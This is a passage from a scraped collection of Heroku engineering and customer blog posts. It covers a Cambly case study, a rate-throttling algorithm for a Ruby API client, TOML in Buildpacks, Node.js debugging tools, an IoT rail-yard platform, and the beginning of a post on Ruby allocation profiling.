pronunciation, as well as cultural and regional differences. “Often, people just want to talk with someone who understands what they do for a living,” says Kevin. “With their English-speaking counterpart, they can go much deeper than casual conversation and get themselves ready to converse in a professional way.” Sometimes, these industry segments develop organically on Cambly in surprising ways. At one point, the founders noticed a trend with one small group of tutors: retired airplane pilots. These tutors happened to be booked solid, even though Cambly did not specifically target their particular industry. It turned out, one of Cambly’s students was a pilot for Turkish Airlines who had posted about his experience in an online forum for pilots. His colleagues saw the post and were inspired to try Cambly themselves. Naturally, Turkish-speaking pilots can fly domestic routes within Turkey with no problem. But to fly to international destinations like San Francisco or Beijing, pilots must be able to communicate with air traffic control in English. It’s hard to learn and practice those conversations in a typical English class. That’s where Cambly fills the gap with tutors who, like the retired pilots, can teach learners the terminology and phrases that require fluency. Many industries require applicants to pass a standardized exam, such as the IELTS or TOEFL, to qualify for particular jobs. Similarly, academic institutions also require testing as part of their admissions process. Cambly provides tutors that specialize in helping learners prepare for these exams and take a critical next step in their career path. Turning the tables: learning Spanish from an English tutor The name “Cambly” is actually derived from the Spanish word “intercambio,” which means “exchange.” In the early days, Cambly supported both English and Spanish language learning. However, the numbers of English learners far surpassed Spanish learners. Also, the goals and level of commitment were very different between the two segments, particularly when it comes to the professional context. So, the founders eventually decided to optimize the platform for English only. Undaunted, Spanish learners found a clever workaround on Cambly. One advantage of the platform’s diverse community of tutors is that many are multilingual. Learners can choose a tutor who also speaks their own native language, which can come in handy when they get stuck. But it also opens up a hidden opportunity for native English speakers. Cambly’s Spanish-speaking tutors have reported that occasionally students come to them, not to learn English, but to practice Spanish. Tutors are surprised when one of these unusual students logs into a chat, but the unstructured nature of conversation practice makes it easy to shift gears. Spanish learners can enjoy an equally rich experience on Cambly, and also benefit from a tutor’s professional background in the same way. In the era of working from home When the COVID-19 pandemic emerged, people around the world were forced to stay at home indefinitely. For some, this meant more time to focus on self-improvement goals, such as language learning. Cambly saw a massive surge in traffic as lockdowns swept the world in the coming weeks. A wave of new learners joined Cambly and existing learners were logging in more often. The pandemic also brought a spike in Cambly Kids , the company's language learning product for children. As families were under stay-at-home orders, parents looked for ways to supplement their children's online studies or fill their day with educational activities. During this unprecedented global experience, the Cambly team has seen the beginning of a paradigm shift in language learning. As Kevin says, “I think people are still getting used to the idea of learning English online, but there’s so much value that technology brings. You can record sessions and go back and review them. We offer translation tools in the chat, so you can look up words in the moment. It’s forcing people to think about nontraditional ways to learn English and they want to try it out on Cambly.” Read the Cambly case study to learn more about how Kevin and team built Cambly on Heroku. economy Cambly education learning remote language", "date": "2020-07-21,"},
{"website": "Heroku", "title": "A Fast Car Needs Good Brakes: How We Added Client Rate Throttling to the Platform API Gem", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/rate-throttle-api-client", "abstract": "A Fast Car Needs Good Brakes: How We Added Client Rate Throttling to the Platform API Gem Posted by Richard Schneeman July 07, 2020 Listen to this article When API requests are made one-after-the-other they'll quickly hit rate limits and when that happens: If you provide an API client that doesn't include rate limiting, you don't really have an API client. You've got an exception generator with a remote timer. — Richard Schneeman 🤠 Stay Inside (@schneems) June 12, 2019 That tweet spawned a discussion that generated a quest to add rate throttling logic to the platform-api gem that Heroku maintains for talking to its API in Ruby. If the term \"rate throttling\" is new to you, read Rate limiting, rate throttling, and how they work together The Heroku API uses Genetic Cell Rate Algorithm (GCRA) as described by Brandur in this post on the server-side. Heroku's API docs state: The API limits the number of requests each user can make per hour to protect against abuse and buggy code. Each account has a pool of request tokens that can hold at most 4500 tokens. Each API call removes one token from the pool. Tokens are added to the account pool at a rate of roughly 75 per minute (or 4500 per hour), up to a maximum of 4500. If no tokens remain, further calls will return 429 Too Many Requests until more tokens become available. I needed to write an algorithm that never errored as a result of a 429 response. A \"simple\" solution would be to add a retry to all requests when they see a 429, but that would effectively DDoS the API. I made it a goal for the rate throttling client also to minimize its retry rate. That is, if the client makes 100 requests, and 10 of them are a 429 response that its retry rate is 10%. Since the code needed to be contained entirely in the client library, it needed to be able to function without distributed coordination between multiple clients on multiple machines except for whatever information the Heroku API returned. Making client throttling maintainable Before we can get into what logic goes into a quality rate throttling algorithm, I want to talk about the process that I used as I think the journey is just as fascinating as the destination. I initially started wanting to write tests for my rate throttling strategy. I quickly realized that while testing the behavior \"retries a request after a 429 response,\" it is easy to check. I also found that checking for quality \"this rate throttle strategy is better than others\" could not be checked quite as easily. The solution that I came up with was to write a simulator in addition to tests. I would simulate the server's behavior, and then boot up several processes and threads and hit the simulated server with requests to observe the system's behavior. I initially just output values to the CLI as the simulation ran, but found it challenging to make sense of them all, so I added charting. I found my simulation took too long to run and so I added a mechanism to speed up the simulated time. I used those two outputs to write what I thought was a pretty good rate throttling algorithm. The next task was wiring it up to the platform-api gem. To help out I paired with a Heroku Engineer, Lola , we ended up making several PRs to a bunch of related projects, and that's its own story to tell. Finally, the day came where we were ready to get rate throttling into the platform-api gem; all we needed was a review. Unfortunately, the algorithm I developed from \"watching some charts for a few hours\" didn't make a whole lot of sense, and it was painfully apparent that it wasn't maintainable. While I had developed a good gut feel for what a \"good\" algorithm did and how it behaved, I had no way of solidifying that knowledge into something that others could run with. Imagine someone in the future wants to make a change to the algorithm, and I'm no longer here. The tests I had could prevent them from breaking some expectations, but there was nothing to help them make a better algorithm. The making of an algorithm At this point, I could explain the approach I had taken to build an algorithm, but I had no way to quantify the \"goodness\" of my algorithm. That's when I decided to throw it all away and start from first principles. Instead of asking \"what would make my algorithm better,\" I asked, \"how would I know a change to my algorithm is better\" and then worked to develop some ways to quantify what \"better\" meant. Here are the goals I ended up coming up with: Minimize average retry rate: The fewer failed API requests, the better Minimize maximum sleep time: Rate throttling involves waiting, and no one wants to wait for too long Minimize variance of request count between clients: No one likes working with a greedy co-worker, API clients are no different. No client in the distributed system should be an extended outlier Minimize time to clear a large request capacity: As the system changes, clients should respond quickly to changes. I figured that if I could generate metrics on my rate-throttle algorithm and compare it to simpler algorithms, then I could show why individual decisions were made. I moved my hacky scripts for my simulation into a separate repo and, rather than relying on watching charts and logs, moved to have my simulation produce numbers that could be used to quantify and compare algorithms . With that work under my belt, I threw away everything I knew about rate-throttling and decided to use science and measurement to guide my way. Writing a better rate-throttling algorithm with science: exponential backoff Earlier I mentioned that a \"simple\" algorithm would be to retry requests. A step up in complexity and functionality would be to retry requests after an exponential backoff. I coded it up and got some numbers for a simulated 30-minute run (which takes 3 minutes of real-time): Avg retry rate:      60.08 %\nMax sleep time:      854.89 seconds\nStdev Request Count: 387.82\n\nTime to clear workload (4500 requests, starting_sleep: 1s):\n74.23 seconds Now that we've got baseline numbers, how could we work to minimize any of these values? In my initial exponential backoff model, I multiplied sleep by a factor of 2.0, what would happen if I increased it to 3.0 or decreased it to 1.2? To find out, I plugged in those values and re-ran my simulations. I found that there was a correlation between retry rate and max sleep value with the backoff factor, but they were inverse. I could lower the retry rate by increasing the factor (to 3.0), but this increased my maximum sleep time. I could reduce the maximum sleep time by decreasing the factor (to 1.2), but it increased my retry rate. That experiment told me that if I wanted to optimize both retry rate and sleep time, I could not do it via only changing the exponential factor since an improvement in one meant a degradation in the other value. At this point, we could theoretically do anything, but our metrics judge our success. We could put a cap on the maximum sleep time, for example, we could write code that says \"don't sleep longer than 300 seconds\", but it too would hurt the retry rate. The biggest concern for me in this example is the maximum sleep time, 854 seconds is over 14 minutes which is WAAAYY too long for a single client to be sleeping. I ended up picking the 1.2 factor to decrease that value at the cost of a worse retry-rate: Avg retry rate:      80.41 %\nMax sleep time:      46.72 seconds\nStdev Request Count: 147.84\n\nTime to clear workload (4500 requests, starting_sleep: 1s):\n74.33 seconds Forty-six seconds is better than 14 minutes of sleep by a long shot. How could we get the retry rate down? Incremental improvement: exponential sleep with a gradual decrease In the exponential backoff model, it backs-off once it sees a 429, but as soon as it hits a success response, it doesn't sleep at all. One way to reduce the retry-rate would be to assume that once a request had been rate-throttled, that future requests would need to wait as well. Essentially we would make the sleep value \"sticky\" and sleep before all requests. If we only remembered the sleep value, our rate throttle strategy wouldn't be responsive to any changes in the system, and it would have a poor \"time to clear workload.\" Instead of only remembering the sleep value, we can gradually reduce it after every successful request. This logic is very similar to TCP slow start . How does it play out in the numbers? Avg retry rate:      40.56 %\nMax sleep time:      139.91 seconds\nStdev Request Count: 867.73\n\nTime to clear workload (4500 requests, starting_sleep: 1s):\n115.54 seconds Retry rate did go down by about half. Sleep time went up, but it's still well under the 14-minute mark we saw earlier. But there's a problem with a metric I've not talked about before, the \"stdev request count.\" It's easier to understand if you look at a chart to see what's going on: Here you can see one client is sleeping a lot (the red client) while other clients are not sleeping at all and chewing through all the available requests at the bottom. Not all the clients are behaving equitably. This behavior makes it harder to tune the system. One reason for this inequity is that all clients are decreasing by the same constant value for every successful request. For example, let's say we have a client A that is sleeping for 44 seconds, and client B that is sleeping for 11 seconds and both decrease their sleep value by 1 second after every request. If both clients ran for 45 seconds, it would look like this: Client A) Sleep 44 (Decrease value: 1)\nClient B) Sleep 11 (Decrease value: 1)\nClient B) Sleep 10 (Decrease value: 1)\nClient B) Sleep  9 (Decrease value: 1)\nClient B) Sleep  8 (Decrease value: 1)\nClient B) Sleep  7 (Decrease value: 1)\nClient A) Sleep 43 (Decrease value: 1) So while client A has decreased by 1 second total, client B has reduced by 4 seconds total, since it is firing 4x as fast (i.e., it's sleep time is 4x lower). So while the decrease rate is equal, it is not equitable. Ideally, we would want all clients to decrease at the same rate. All clients created equal: exponential increase proportional decrease Since clients cannot communicate with each other in our distributed system, one way to guaranteed proportional decreases is to use the sleep value in the decrease amount: decrease_value = (sleep_time) / some_value Where some_value is a magic number. In this scenario the same clients A and B running for 45 seconds would look like this with a value of 100: Client A) Sleep 44\nClient B) Sleep 11\nClient B) Sleep 10.89 (Decrease value: 11.00/100 = 0.1100)\nClient B) Sleep 10.78 (Decrease value: 10.89/100 = 0.1089)\nClient B) Sleep 10.67 (Decrease value: 10.78/100 = 0.1078)\nClient B) Sleep 10.56 (Decrease value: 10.67/100 = 0.1067)\nClient A) Sleep 43.56 (Decrease value: 44.00/100 = 0.4400) Now client A has had a decrease of 0.44, and client B has had a reduction of 0.4334 (11 seconds - 10.56 seconds), which is a lot more equitable than before. Since some_value is tunable, I wanted to use a larger number so that the retry rate would be lower than 40%. I chose 4500 since that's the maximum number of requests in the GCRA bucket for Heroku's API. Here's what the results looked like: Avg retry rate:      3.66 %\nMax sleep time:      17.31 seconds\nStdev Request Count: 101.94\n\nTime to clear workload (4500 requests, starting_sleep: 1s):\n551.10 seconds The retry rate went WAAAY down, which makes sense since we're decreasing slower than before (the constant decrease value previously was 0.8). Stdev went way down as well. It's about 8x lower. Surprisingly the max sleep time went down as well. I believe this to be a factor of a decrease in the number of required exponential backoff events. Here's what this algorithm looks like: The only problem here is that the \"time to clear workload\" is 5x higher than before. What exactly is being measured here? In this scenario, we're simulating a cyclical workflow where clients are running under high load, then go through a light load, and then back to a high load. The simulation starts all clients with a sleep value, but the server's rate-limit is reset to 4500. The time is how long it takes the client to clear all 4500 requests. What this metric of 551 seconds is telling me is that this strategy is not very responsive to a change in the system. To illustrate this problem, I ran the same algorithm starting each client at 8 seconds of sleep instead of 1 second to see how long it would take to trigger a rate limit: The graph shows that it takes about 7 hours to clear all these requests, which is not good. What we need is a way to clear requests faster when there are more requests. The only remaining option: exponential increase proportional remaining decrease When you make a request to the Heroku API, it tells you how many requests you have left remaining in your bucket in a header. Our problem with the \"proportional decrease\" is mostly that when there are lots of requests remaining in the bucket, it takes a long time to clear them (if the prior sleep rate was high, such as in a varying workload). To account for this, we can decrease the sleep value quicker when the remaining bucket is full and slower when the remaining bucket is almost empty. To express that in an expression, it might look like this: decrease_value = (sleep_time * request_count_remaining) / some_value In my case, I chose some_value to be the maximum number of requests possible in a bucket, which is 4500. You can imagine a scenario where workers were very busy for a period and being rate limited. Then no jobs came in for over an hour - perhaps the workday was over, and the number of requests remaining in the bucket re-filled to 4500. On the next request, this algorithm would reduce the sleep value by itself since 4500/4500 is one: decrease_value = sleep_time * 4500 / 4500 That means it doesn't matter how immense the sleep value is, it will adjust fairly quickly to a change in workload. Good in theory, how does it perform in the simulation? Avg retry rate:      3.07 %\nMax sleep time:      17.32 seconds\nStdev Request Count: 78.44\n\nTime to clear workload (4500 requests, starting_sleep: 1s):\n84.23 seconds This rate throttle strategy performs very well on all metrics. It is the best (or very close) to several metrics. Here's a chart: This strategy is the \"winner\" of my experiments and the algorithm that I  chose to go into the platform-api gem. My original solution While I originally built this whole elaborate scheme to prove how my solution was optimal, I did something by accident. By following a scientific and measurement-based approach, I accidentally found a simpler solution that performed better than my original answer. Which I'm happier about, it shows that the extra effort was worth it. To \"prove\" what I found by observation and tinkering could be not only quantified by numbers but improved upon is fantastic. While my original solution had some scripts and charts, this new solution has tests covering the behavior of the simulation and charting code. My initial solution was very brittle. I didn't feel very comfortable coming back and making changes to it; this new solution and the accompanying support code is a joy to work with. My favorite part though is that now if anyone asks me, \"what about trying \" or \"have you considered \" is that I can point them at my rate client throttling library , they have all the tools to implement their idea, test it, and report back with a swift feedback loop. gem 'platform-api', '~> 3.0' While I mostly wanted to talk about the process of writing rate-throttling code, this whole thing started from a desire to get client rate-throttling into the platform-api gem. Once I did the work to prove my solution was reasonable, we worked on a rollout strategy. We released a version of the gem in a minor bump with rate-throttling available, but with a \"null\" strategy that would preserve existing behavior. This release strategy allowed us to issue a warning to anyone depending on the original behavior. Then we released a major version with the rate-throttling strategy enabled by default. We did this first with \"pre\" release versions and then actual versions to be extra safe. So far, the feedback has been overwhelming that no one has noticed. We didn't cause any significant breaks or introduce any severe disfunction to any applications. If you've not already, I invite you to upgrade to 3.0.0+ of the platform-api gem and give it a spin. I would love to hear your feedback. Get ahold of Richard and stay up-to-date with Ruby, Rails, and other programming related content through a subscription to his mailing list . platform api api client api rate limit rate throttle ruby", "date": "2020-07-07,"},
{"website": "Heroku", "title": "Ground Control to Major TOML: Why Buildpacks Use a Most Peculiar Format", "author": ["Joe Kutner"], "link": "https://blog.heroku.com/why-buildpacks-use-toml", "abstract": "Ground Control to Major TOML: Why Buildpacks Use a Most Peculiar Format Posted by Joe Kutner July 22, 2020 Listen to this article YAML files dominate configuration in the cloud native ecosystem. They’re used by Kuberentes, Helm, Tekton, and many other projects to define custom configuration and workflows. But YAML has its oddities, which is why the Cloud Native Buildpacks project chose TOML as its primary configuration format. TOML is a minimal configuration file format that's easy to read because of its simple semantics. You can learn more about TOML from the official documentation , but a simple buildpack TOML file looks like this: api = \"0.2\"\n\n[buildpack]\nid = \"heroku/maven\"\nversion = \"1.0\"\nname = \"Maven\" Unlike YAML, TOML doesn’t rely on significant whitespace with difficult to read indentation. TOML is designed to be human readable, which is why it favors simple structures. It’s also easy for machines to read and write; you can even append to a TOML file without reading it first, which makes it a great data interchange format. But data interchange and machine readability aren’t the main driver for using TOML in the Buildpacks project; it’s humans. Put Your Helmet On The first time you use Buildpacks, you probably won’t need to write a TOML file. Buildpacks are designed to get out of your way, and disappear into the details. That’s why there’s no need for large configuration files like a Helm values.yaml or a Kubernetes pod configuration . Buildpacks favor convention over configuration, and therefore don’t require complex customizations to tweak the inner workings of its tooling. Instead, Buildpacks detect what to do based on the contents of an application, which means configuration is usually limited to simple properties that are defined by a human. Buildpacks also favor infrastructure as imperative code (rather than declarative ). Buildpacks themselves are functions that run against an application, and are best implemented in higher level languages, which can use libraries and testing. All of these properties lend to a simple configuration format and schema that doesn’t define complex structures. But that doesn’t mean the decision to use TOML was simple. Can You Hear Me, Major TOML? There are many other formats the Buildpacks project could have used besides YAML or TOML, and the Buildpacks core team considered all of these in the early days of the project. JSON has simple syntax and semantics that are great for data interchange, but it doesn’t make a great human-readable format; in part because it doesn’t allow for comments. Buildpacks use JSON for machine readable config, like the OCI image metadata. But it shouldn’t be used for anything a human writes. XML has incredibly powerful properties including schema validation, transformation tools, and rich semantics. It’s great for markup (like HTML) but it's much too heavy of a format for what Buildpacks require. In the end, the Buildpacks project was comfortable choosing TOML because there was solid prior art (even though the format is somewhat obscure). In the cloud native ecosystem, the containerd project uses TOML. Additionally, many language ecosystem tools like Cargo (for Rust) and Poetry (for Python) use TOML to configure application dependencies. Commencing Countdown, Engines On The main disadvantage of TOML is its ubiquity. Tools that parse and query TOML files (something comparable to jq ) aren’t readily available, and the format can still be jarring to new users even though it’s fairly simple. Every trend has to start somewhere, and the Cloud Native Buildpacks project is happy to be one of the projects stepping through the door. If you want to learn more or have any questions around Cloud Native Buildpacks, we will be hosting a Live AMA at Hackernoon on July 28th at 2pm PDT. See you there! Cloud Native Buildpacks TOML buildpacks", "date": "2020-07-22,"},
{"website": "Heroku", "title": "Let's Debug a Node.js Application", "author": ["Julián Duque"], "link": "https://blog.heroku.com/debug-node-applications", "abstract": "Let's Debug a Node.js Application Posted by Julián Duque August 03, 2020 Listen to this article There are always challenges when it comes to debugging applications. Node.js' asynchronous workflows add an extra layer of complexity to this arduous process. Although there have been some updates made to the V8 engine in order to easily access asynchronous stack traces, most of the time, we just get errors on the main thread of our applications, which makes debugging a little bit difficult. As well, when our Node.js applications crash, we usually need to rely on some complicated CLI tooling to analyze the core dumps . In this article, we'll take a look at some easier ways to debug your Node.js applications. Logging Of course, no developer toolkit is complete without logging. We tend to place console.log statements all over our code in local development, but this is not a really scalable strategy in production. You would likely need to do some filtering and cleanup, or implement a consistent logging strategy, in order to identify important information from genuine errors. Instead, to implement a proper log-oriented debugging strategy, use a logging tool like Pino or Winston . These will allow you to set log levels ( INFO , WARN , ERROR ), allowing you to print verbose log messages locally and only severe ones for production. You can also stream these logs to aggregators, or other endpoints, like LogStash, Papertrail, or even Slack. Working with Node Inspect and Chrome DevTools Logging can only take us so far in understanding why an application is not working the way we would expect. For sophisticated debugging sessions, we will want to use breakpoints to inspect how our code behaves at the moment it is being executed. To do this, we can use Node Inspect. Node Inspect is a debugging tool which comes with Node.js. It's actually just an implementation of Chrome DevTools for your program, letting you add breakpoints, control step-by-step execution, view variables, and follow the call stack. There are a couple of ways to launch Node Inspect, but the easiest is perhaps to just call your Node.js application with the --inspect-brk flag: $ node --inspect-brk $your_script_name After launching your program, head to the chrome://inspect URL in your Chrome browser to get to the Chrome DevTools. With Chrome DevTools, you have all of the capabilities you'd normally expect when debugging JavaScript in the browser. One of the nicer tools is the ability to inspect memory . You can take heap snapshots and profile memory usage to understand how memory is being allocated, and potentially, plug any memory leaks. Using a supported IDE Rather than launching your program in a certain way, many modern IDEs also support debugging Node applications. In addition to having many of the features found in Chrome DevTools, they bring their own features, such as creating logpoints and allowing you to create multiple debugging profiles. Check out the Node.js' guide on inspector clients for more information on these IDEs. Using NDB Another option is to install ndb , a standalone debugger for Node.js. It makes use of the same DevTools that are available in the browser, just as an isolated, local debugger. It also has some extra features that aren't available in DevTools. It supports edit-in-place, which means you can make changes to your code and have the updated logic supported directly by the debugger platform. This is very useful for doing quick iterations. Post-Mortem Debugging Suppose your application crashes due to a catastrophic error, like a memory access error. These may be rare, but they do happen, particularly if your app relies on native code. To investigate these sorts of issues, you can use llnode . When your program crashes, llnode can be used to inspect JavaScript stack frames and objects by mapping them to objects on the C/C++ side. In order to use it, you first need a core dump of your program. To do this, you will need to use process.abort instead of process.exit to shut down processes in your code. When you use process.abort , the Node process generates a core dump file on exit. To better understand what llnode can provide, here is a video which demonstrates some of its capabilities. Useful Node Modules Aside from all of the above, there are also a few third-party packages that we can recommend for further debugging. debug The first of these is called, simply enough, debug . With debug, you can assign a specific namespace to your log messages, based on a function name or an entire module. You can then selectively choose which messages are printed to the console via a specific environment variable. For example, here's a Node.js server which is logging several messages from the entire application and middleware stack, like sequelize , express:application , and express:router : If we set the DEBUG environment variable to express:router and start the same program, only the messages tagged as express:router are shown: By filtering messages in this way, we can hone in on how a single segment of the application is behaving, without needing to drastically change the logging of the code. trace and clarify Two more modules that go together are trace and clarify . trace augments your asynchronous stack traces by providing much more detailed information on the async methods that are being called, a roadmap which Node.js does not provide by default. clarify helps by removing all of the information from stack traces which are specific to Node.js internals. This allows you to concentrate on the function calls that are just specific to your application. Neither of these modules are recommended for running in production! You should only enable them when debugging issues in your local development environment. Find out more If you'd like to follow along with how to use these debugging tools in practice, here is a video recording which provides more detail. It includes some live demos of how to narrow in on problems in your code. Or, if you have any other questions, you can find me on Twitter @julian_duque ! javascript debugging node", "date": "2020-08-03,"},
{"website": "Heroku", "title": "How to Transform a Heavy Industry, One Sensor at a Time", "author": ["Sally Vedros"], "link": "https://blog.heroku.com/transform-a-heavy-industry", "abstract": "How to Transform a Heavy Industry, One Sensor at a Time Posted by Sally Vedros September 14, 2020 Listen to this article Moving shipping containers is heavy work. Moving a traditional industry into the digital age is a different kind of heavy job. Software development agency GNAR took on the challenge and built an ops management platform for RMS Intermodal , one of the largest rail yard operators in the U.S. Their IoT solution gave RMS a data-driven view of their operations for the first time, resulting in a whole new definition of “efficiency” for the company. Serendipity manifests a new idea It all started at a wedding. GNAR Founder Brandon Stewart found himself chatting with Adam Gray , the son of RMS Intermodal’s President, and the conversation turned to RFID tracking. Brandon had done some work on an RFID solution for running events, and Adam was curious about the technology. Could it be applied to his father’s rail yards in order to harness the chaotic swirl of trucks and forklifts and cranes? The two men put their heads together and spent the next few months researching the problem space. “We visited two local RMS sites in California and surveyed over 40 locations,” Brandon says. “We sat inside the trucks, and watched how people worked. We met with managers, crews, and executives to better understand their day-to-day challenges as well as the industry at large.” The traditional way: radios, clipboards, and Excel to manage a lot of moving parts Looking at rail yard operations, Brandon and Adam found that efficiency is measured by job completion speed and workforce costs. Fundamentally, it’s all about how fast the crew can get shipping containers on and off a train, with a number of specialized equipment involved in moving the heavy boxes. The goal is to have the right number of workers doing the right activities at the right moment. The yard manager typically has a 24-hour window to prepare for an incoming train and can use a terminal operating system (TOS) — train industry software — to get the arrival time, container count, and track number. That time is precious, as once the train arrives, a flurry of activity begins. The manager drives around the yard to corral the crew and delivers orders via two-way radio. Forklifts stack trailers alongside the train track, almost like “staging” the train. The crane then comes and starts pulling boxes off the train and dropping them onto the trailers. A hostler truck connects to the trailer and moves the container to a designated place in the yard, where it is unloaded and stored. Throughout the process, the manager is trying to stay on top of all the moving parts, but, in a large yard that staffs up to 70 workers at a time, it can be tough. Managers are challenged to keep all workers actively engaged, but they often struggle to have direct visibility into basic operations, like which worker is operating which vehicle. This is primarily due to the long rectangular layout of the yards and rows of stacked containers (similar to a large outdoor warehouse). Meanwhile, the clock is ticking and the train needs to get unloaded as quickly as possible. It doesn’t stop there. Once the job is complete, the manager fills out a clipboard full of paperwork, which then gets sent to the head office for record keeping and billing purposes, much of it stored in Excel spreadsheets. This adds extra time and overhead for managers as well as office staff. The new way: an IoT platform for efficient rail yard management Inspired by ride-hailing apps like Uber and Lyft, Adam, Brandon, and the GNAR team designed a solution that uses GPS coordinates streamed from Android tablets in each vehicle. Their new platform, Intrmodl , turns the vehicles themselves into connected IoT devices that could send real-time data to a central platform for processing and analytics. The driver app not only tracks its vehicle’s location in the yard across time, but also logs usage stats, like fuel level and engine hours, and travel paths and duration, as well as vehicle inspection details. Managers now have a bird’s eye view of all their workers and vehicles in a dedicated manager’s app. During unloading activity, they can track precisely who’s doing what and take quick action to correct or fine-tune the activities. Managers can forgo the radio and communicate with one or the whole crew via the app, as well as stay on top of maintenance needs. The app also makes it easier for managers to perform audits and site inspections. For upper management, the main platform provides business analytics that helps them track patterns in site activity and the overall performance of their operations across all their yards. Execs can see metrics the following day rather than waiting until the end of the month to see what happened yesterday. The data is useful to the business in a number of ways, such as informing profitability targets or bids to train companies. Brandon says, “Our data shows train companies how a yard adds even more value by demonstrating consistent levels of efficiency.” Extracting meaning from a firehose of data Every two seconds, live sensors in each vehicle stream massive amounts of data into the Intrmodl platform. One of the challenges for the development team was how to clean and distill all that data into a couple of bytes of really useful, actionable insights for the leadership to access quickly. “We maintain a three tier or three reservoir kind of setup,” says Brandon, “where the live data is constantly coming in and we're queueing it and making sure that we're digesting it and keeping everything in order.” They also had to figure out a way to flush data from the database once it’s no longer needed. Another challenge was how to loop in signature moments in the workday, such as going on break. So, they set up sessions that define triggers for those signature moments to kick in and inform how data is captured during the break and ensures that work time data is more meaningful. A third challenge was how to build a daily report that included a calculated overall metric for the day and allow it to be queryable. This would help managers quickly see if their productivity was on target — perhaps 10% ahead or 20% behind — compared to a rolling average. The path to par: defining what top performance looks like Previously, RMS had a hard time determining true benchmarks for performance metrics due to the lack of visibility across yard activities. “They never knew exactly what par was for them,” says Brandon. “They only had an idea of what par was. Now, they can identify more granular targets for specific vehicles and tasks that are based in real-time data.” Managers can set realistic performance expectations across the team, and reward star workers or coach underperformers. Metrics vary from yard to yard due to the variety of services that each yard offers to train companies. The heavy-lifting is now easier for more yards, and more industries RMS Intermodal’s digital strategy is paying off. With data insights readily available, the business can make better decisions and strengthen relationships with train companies and other partners. Today, Intrmodl has been fully deployed in six RMS yards, and about 50 others use some aspect of the platform. Going forward, Brandon and the GNAR team are continuing to work on enhancements. They’re looking to take advantage of more tablet sensor capabilities to further map vehicle movements and workflows. They also plan to address improvements to billing and forecasting. Brandon also helped RMS hire their first IT team who will eventually take the platform in-house. RMS is an innovator in a deeply traditional industry, but their ideas don’t end with rail yards. One exciting aspect of the Intrmodl technology is that it’s flexible enough to apply to other industry use cases, such as automobile transportation. RMS owns their own fleet of trucks and also operates yards for storing shipments of new cars. The RMS story is only the beginning. Brandon can envision the IoT platform serving other traditional industries that orchestrate the movement of heavy things and vehicles. Airlines, shipping, construction, mining, warehousing — all can benefit from real-time data insights from a complex dance of moving parts. Wherever their clients want to put a sensor, the platform is ready to make sense of it. Read the GNAR case study to learn more about Intrmodl on Heroku. Listen to the Code[ish] podcast featuring Brandon Stewart and Yuri Oliveira: Monitoring Productivity Through IoT. IoT", "date": "2020-09-14,"},
{"website": "Heroku", "title": "The Life-Changing Magic of Tidying Ruby Object Allocations", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/tidying-ruby-object-allocations", "abstract": "The Life-Changing Magic of Tidying Ruby Object Allocations Posted by Richard Schneeman September 16, 2020 Listen to this article Your app is slow. It does not spark joy. This post will use memory allocation profiling tools to discover performance hotspots, even when they're coming from inside a library. We will use this technique with a real-world application to identify a piece of optimizable code in Active Record that ultimately leads to a patch with a substantial impact on page speed. In addition to the talk, I've gone back and written a full technical recap of each section to revisit it any time you want without going through the video. I make heavy use of theatrics here, including a Japanese voiceover artist, animoji, and some edited clips of Marie Kondo's Netflix TV show. This recording was done at EuRuKo on a boat. If you've got the time, here's the talk: Intro to Tidying Object Allocations Tidying Example 1: Active Record respond_to? logic Performance and Statistical Significance Tidying example 2: Converting strings to time takes time Tidying Example 3: Lightning fast cache keys Intro to Tidying Object Allocations The core premise of this talk is that we all want faster applications. Here I'm making the pitch that you can get significant speedups by focusing on your object allocations. To do that, I'll eventually show you a few real-world cases of PRs I made to Rails along with a \"how-to\" that shows how I used profiling and benchmarking to find and fix the hotspots. At a high level, the \"tidying\" technique looks like this: Take all your object allocations and put them in a pile where you can see them Consider each one: Does it spark joy? Keep only the objects that spark joy An object sparks joy if it is useful, keeps your code clean, and does not cause performance problems. If an object is absolutely necessary, and removing it causes your code to crash, it sparks joy. To put object allocations in front of us we'll use: memory_profiler derailed_benchmarks To get a sense of the cost of object allocation, we can benchmark two different ways to perform the same logic. One of these allocates an array while the other does not. require 'benchmark/ips'\n\ndef compare_max(a, b)\n  return a if a > b\n  b\nend\n\ndef allocate_max(a, b)\n  array = [a, b] # <===== Array allocation here\n  array.max\nend\n\nBenchmark.ips do |x|\n  x.report(\"allocate_max\") {\n    allocate_max(1, 2)\n  }\n  x.report(\"compare_max \") {\n    compare_max(1, 2)\n  }\n  x.compare!\nend This gives us the results: Warming up --------------------------------------\n        allocate_max   258.788k i/100ms\n        compare_max    307.196k i/100ms\nCalculating -------------------------------------\n        allocate_max      6.665M (±14.6%) i/s -     32.090M in   5.033786s\n        compare_max      13.597M (± 6.0%) i/s -     67.890M in   5.011819s\n\nComparison:\n        compare_max : 13596747.2 i/s\n        allocate_max:  6664605.5 i/s - 2.04x  slower In this example, allocating an array is 2x slower than making a direct comparison. It's a truism in most languages that allocating memory or creating objects is slow. In the C programming language, it's a truism that \"malloc is slow.\" Since we know that allocating in Ruby is slow, we can make our programs faster by removing allocations. As a simplifying assumption, I've found that a decrease in bytes allocated roughly corresponds to performance improvement. For example, if I can reduce the number of bytes allocated by 1% in a request, then on average, the request will have been sped up by about 1%. This assumption helps us benchmark faster as it's much easier to measure memory allocated than it is to repeatedly run hundreds or thousands of timing benchmarks. Tidying Example 1: Active Record respond_to? logic Using the target application CodeTriage.com and derailed benchmarks, we get a \"pile\" of memory allocations: $ bundle exec derailed exec perf:objects\n\nallocated memory by gem\n-----------------------------------\n    227058  activesupport/lib\n    134366  codetriage/app\n    # ...\n\n\nallocated memory by file\n-----------------------------------\n    126489  …/code/rails/activesupport/lib/active_support/core_ext/string/output_safety.rb\n     49448  …/code/codetriage/app/views/layouts/_app.html.slim\n     49328  …/code/codetriage/app/views/layouts/application.html.slim\n     36097  …/code/rails/activemodel/lib/active_model/type/helpers/time_value.rb\n     25096  …/code/codetriage/app/views/pages/_repos_with_pagination.html.slim\n     24432  …/code/rails/activesupport/lib/active_support/core_ext/object/to_query.rb\n     23526  …/code/codetriage/.gem/ruby/2.5.3/gems/rack-mini-profiler-1.0.0/lib/patches/db/pg.rb\n     21912  …/code/rails/activerecord/lib/active_record/connection_adapters/postgresql_adapter.rb\n     18000  …/code/rails/activemodel/lib/active_model/attribute_set/builder.rb\n     15888  …/code/rails/activerecord/lib/active_record/result.rb\n     14610  …/code/rails/activesupport/lib/active_support/cache.rb\n     11109  